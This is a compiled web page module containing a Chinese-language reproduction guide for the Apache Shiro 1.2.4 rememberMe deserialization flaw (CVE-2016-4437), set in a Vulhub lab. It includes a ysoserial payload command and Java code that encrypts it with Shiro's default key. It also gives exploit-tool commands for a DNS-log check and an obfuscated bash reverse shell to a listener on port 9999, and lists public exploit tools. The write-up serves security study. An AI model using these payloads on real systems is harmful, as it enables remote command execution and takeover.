import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as a,d as e,e as t}from"./app-58e4a7d6.js";const l={},u=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Shiro &lt;= 1.2.4
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问<code>http://your-ip:8080</code>可使用<code>admin:vulhub</code>进行登录。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="方法1-shiro默认密钥加密payload" tabindex="-1"><a class="header-anchor" href="#方法1-shiro默认密钥加密payload" aria-hidden="true">#</a> 方法1 Shiro默认密钥加密Payload</h3><p>使用ysoserial生成CommonsBeanutils1的Gadget：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>参考Vulhub，可以使用Shiro内置的默认密钥对Payload进行加密：</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>vulhub<span class="token punctuation">.</span>shirodemo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">AesCipherService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span></span><span class="token class-name">CodecSupport</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ByteSource</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">DefaultSerializer</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">FileSystems</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestRemember</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payloads <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">FileSystems</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token string">&quot;/path&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;to&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;poc.ser&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">AesCipherService</span> aes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token class-name">CodecSupport</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span><span class="token string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ByteSource</span> ciphertext <span class="token operator">=</span> aes<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>payloads<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发送rememberMe Cookie，即可成功执行<code>touch /tmp/success</code>。</p><h3 id="方法2-命令行-shiro-exploit" tabindex="-1"><a class="header-anchor" href="#方法2-命令行-shiro-exploit" aria-hidden="true">#</a> 方法2 命令行 Shiro_exploit</h3>`,17),r={href:"https://github.com/insightglacier/Shiro_exploit",target:"_blank",rel:"noopener noreferrer"},d=t(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python shiro_exploit.py -t 3 -u http://192.168.174.128:8080 -p &quot;ping -c 2 shiro.xxxxx.ceye.io&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>dnslog平台接收到请求，证明漏洞存在。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011105220.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行反弹shell语句：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python shiro_exploit.py -t 3 -u http://192.168.174.128:8080 -p &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=}|{base64,-d}|{bash,-i}&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>监听9999端口，接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203010954296.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="开源poc-exp" tabindex="-1"><a class="header-anchor" href="#开源poc-exp" aria-hidden="true">#</a> 开源POC/EXP</h2>`,8),k={href:"https://github.com/sv3nbeast/ShiroScan",target:"_blank",rel:"noopener noreferrer"},h={href:"https://github.com/fupinglee/ShiroScan",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/wyzxxz/shiro_rce_tool",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/feihong-cs/ShiroExploit-Deprecated",target:"_blank",rel:"noopener noreferrer"};function b(g,x){const s=o("ExternalLinkIcon");return c(),i("div",null,[u,n("p",null,[a("此处使用"),n("a",r,[a("Shiro_exploit"),e(s)]),a("进行复现，首先，检测漏洞是否存在：")]),d,n("ul",null,[n("li",null,[n("a",k,[a("https://github.com/sv3nbeast/ShiroScan"),e(s)])]),n("li",null,[n("a",h,[a("https://github.com/fupinglee/ShiroScan"),e(s)])]),n("li",null,[n("a",m,[a("https://github.com/wyzxxz/shiro_rce_tool"),e(s)])]),n("li",null,[n("a",v,[a("https://github.com/feihong-cs/ShiroExploit-Deprecated"),e(s)])])])])}const y=p(l,[["render",b],["__file","Apache Shiro 1.2.4 反序列化漏洞 CVE-2016-4437.html.vue"]]);export{y as default};
